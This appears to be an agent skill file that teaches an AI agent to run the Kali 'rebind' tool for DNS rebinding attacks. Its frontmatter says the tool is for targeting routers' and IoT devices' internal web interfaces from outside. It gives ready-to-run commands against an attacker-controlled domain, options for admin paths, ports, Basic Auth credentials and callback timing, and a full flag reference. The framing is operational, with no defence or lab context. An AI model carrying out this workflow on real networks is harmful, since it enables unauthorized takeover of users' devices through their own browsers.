---
name: rebind
description: Implement DNS rebinding attacks using multiple A records to bypass the Same-Origin Policy. Use when targeting internal web interfaces of routers or IoT devices from an external network, specifically when the target device implements a weak end system model or binds services to the WAN interface.
---

# rebind

## Overview
Rebind is a specialized tool for executing DNS rebinding attacks. It allows an external attacker to gain access to a target's internal web interface (such as a router's configuration page) by tricking a user's browser into bypassing the Same-Origin Policy. It works by serving multiple A records with short TTLs, eventually pointing the attacker's domain to an internal IP address. Category: Sniffing & Spoofing.

## Installation (if not already installed)
The tool is typically pre-installed in Kali Linux. If missing, install via:

```bash
sudo apt update && sudo apt install rebind
```

## Common Workflows

### Basic DNS Rebinding Attack
Start the attack infrastructure on a specific interface for a controlled domain. This initializes the DNS server, attack web server, and callback server.
```bash
rebind -i eth0 -d attacker-domain.com
```

### Targeting a Specific Internal Port and Path
Target a non-standard web interface port (e.g., 8080) and a specific configuration page.
```bash
rebind -i eth0 -d attacker-domain.com -p 8080 -r /admin/config.php
```

### Attack with Custom Authentication Credentials
Specify credentials if the target internal interface uses Basic Authentication.
```bash
rebind -i eth0 -d attacker-domain.com -u admin -a P@ssword123
```

### Setting Custom Callback Intervals
Adjust the frequency (in milliseconds) at which the victim's browser checks back with the attacker's server.
```bash
rebind -i eth0 -d attacker-domain.com -n 5000
```

## Complete Command Reference

The primary binary is `dns-rebind` (often aliased or symlinked as `rebind`).

```
dns-rebind [OPTIONS]
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-i <interface>` | Specify the network interface to bind to | Required |
| `-d <fqdn>` | Specify your registered domain name | Required |
| `-u <user>` | Specify the Basic Authentication user name | `admin` |
| `-a <pass>` | Specify the Basic Authentication password | `admin` |
| `-r <path>` | Specify the initial URL request path | `/` |
| `-t <ip>` | Specify a comma separated list of target IP addresses | `[client IP]` |
| `-n <time>` | Specify the callback interval in milliseconds | `2000` |
| `-p <port>` | Specify the target port | `80` |
| `-c <port>` | Specify the callback port | `81` |
| `-C <value>` | Specify a cookie to set for the client | None |
| `-H <file>` | Specify a file of HTTP headers for the client to send to the target | None |

## Notes
- **Requirements**: You must control the authoritative DNS for the domain specified with `-d`.
- **Targeting**: The attack requires a user inside the target network to visit a website controlled or compromised by the attacker.
- **Success Factors**: This tool is most effective against routers that implement the "weak end system model" in their IP stack and bind web services to the WAN interface.
- **Infrastructure**: When started, the tool launches four components:
  1. DNS server (Port 53)
  2. Attack Web server (Port 80)
  3. Callback Web server (Port 81)
  4. Proxy server (Port 664)